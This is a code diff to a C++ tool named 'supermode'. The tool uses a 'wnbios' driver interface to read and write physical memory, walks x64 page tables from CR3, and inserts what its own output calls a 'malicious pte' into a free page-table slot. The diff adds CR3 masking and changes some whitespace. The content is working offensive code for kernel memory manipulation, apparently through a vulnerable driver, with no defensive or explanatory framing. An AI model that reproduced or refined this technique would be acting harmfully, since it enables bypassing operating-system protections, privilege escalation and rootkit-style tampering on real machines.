@@ -219,11 +219,13 @@ namespace supermode
 			return;
 		}
 
+		uintptr_t dtb = wnbios.cr3 & ~0xf;
+
 		// find a valid entry
 		for (int i = 1; i < 512; i++)
 		{
 			PML4E pml4e;
-			if (!wnbios.read_physical_memory((wnbios.cr3 + i * sizeof(uintptr_t)), &pml4e, sizeof(PML4E)))
+			if (!wnbios.read_physical_memory((dtb + i * sizeof(uintptr_t)), &pml4e, sizeof(PML4E)))
 			{
 				std::cout << "Read failed\n";
 				return;
@@ -426,7 +428,7 @@ namespace supermode
 		valid_pdpte(mal_pte_struct[PDPT], &mal_pte_ind[PDPT], &mal_pte_struct[PD]);
 		valid_pde(mal_pte_struct[PD], &mal_pte_ind[PD], &mal_pte_struct[PT]);
 		free_pte(mal_pte_struct[PT], &mal_pte_ind[PT]);
-
+		
 		uintptr_t va = generate_virtual_address(mal_pte_ind[PML4], mal_pte_ind[PDPT], mal_pte_ind[PD], mal_pte_ind[PT], 0);
 		uintptr_t vad_vpn = (va & 0xFFFFFFFFFFFFF000) / 0x1000;
 		for (auto& zone : forbidden_zones)
@@ -437,16 +439,16 @@ namespace supermode
 				banned_pdpt_indices.push_back(mal_pte_ind[PDPT]);
 				banned_pd_indices.push_back(mal_pte_ind[PD]);
 				banned_pt_indices.push_back(mal_pte_ind[PT]);
-
+		
 				goto find_indices;
 			}
 		}
-
+		
 		std::cout << "PML4: " << mal_pte_ind[PML4] << std::endl
 			<< "PDPT: " << mal_pte_ind[PDPT] << std::endl
 			<< "PD: " << mal_pte_ind[PD] << std::endl
 			<< "PT: " << mal_pte_ind[PT] << std::endl;
-
+		
 		PTE mal_pte;
 		mal_pte.Present = 1;
 		mal_pte.ReadWrite = 1;
@@ -455,12 +457,12 @@ namespace supermode
 		mal_pte.ExecuteDisable = 1;
 		mal_pte.Dirty = 1;
 		mal_pte.Accessed = 1;
-
+		
 		uintptr_t mal_pte_phys = mal_pte_struct[PT] + mal_pte_ind[PT] * sizeof(uintptr_t);
 		mal_pte_pfn = calc_pfnpte_from_addr(mal_pte_phys);
-
+		
 		std::cout << "Offset: " << mal_pte_pfn.offset << std::endl;
-
+		
 		wnbios.write_physical_memory(mal_pte_phys, &mal_pte, sizeof(PTE));
 		std::cout << "inserted first malicious pte at index " << mal_pte_ind[PT] << " [" << std::hex << mal_pte_phys << "] " << std::dec << std::endl;
 	}
